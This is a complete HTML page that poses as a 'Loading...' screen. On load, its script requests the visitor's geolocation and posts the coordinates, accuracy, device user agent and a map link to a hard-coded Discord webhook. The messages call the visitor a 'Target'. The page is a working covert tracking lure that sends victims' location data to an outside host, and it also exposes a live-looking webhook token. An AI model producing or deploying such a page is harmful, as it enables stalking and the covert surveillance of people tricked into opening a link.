<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
</head>
<body>
  <h2>Loading...</h2>
  <script>
    // Your webhook URL
    const webhookUrl = "https://discord.com/api/webhooks/1365943749418684436/a92zO8H5VDyeY1Emq_3vXGYn3cvawfRgGkkt3Y7yZ05ooubEatnxu-fjiyfaUujNmLzx";

    function sendToDiscord(message) {
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: message })
      });
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error);
      } else {
        sendToDiscord("[!] Geolocation is not supported by this browser.");
      }
    }

    function success(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const accuracy = position.coords.accuracy;
      const userAgent = navigator.userAgent;

      const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

      const message = `
📍 **New Target Location Captured!**
🌎 **Latitude:** ${latitude}
🌍 **Longitude:** ${longitude}
🎯 **Accuracy:** ±${accuracy} meters
📱 **Device Info:** ${userAgent}
🗺️ **Maps Link:** ${googleMapsLink}
      `;

      sendToDiscord(message);
    }

    function error(err) {
      sendToDiscord("[!] Failed to get location: " + err.message);
    }

    // Start
    getLocation();
  </script>
</body>
</html>
